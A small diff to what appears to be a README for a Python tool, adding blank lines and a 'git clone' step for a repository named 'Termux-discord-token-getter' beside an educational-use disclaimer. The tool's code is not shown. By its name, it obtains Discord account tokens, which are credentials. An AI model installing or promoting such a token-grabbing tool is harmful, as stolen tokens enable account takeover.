@@ -13,6 +13,8 @@ Requirement
 pip install requests
 and then main.py
 
+ 
+
 ## ⚠️ Disclaimer
 This tool is for educational and personal use only. Do not use it for spam, abuse, or violating any platform's Terms of Service.
 
@@ -23,4 +25,6 @@ This tool is for educational and personal use only. Do not use it for spam, abus
 
 Install dependencies:
 ```bash
+git clone https://github.com/nxgq/Termux-discord-token-getter.git
 pip install requests
+
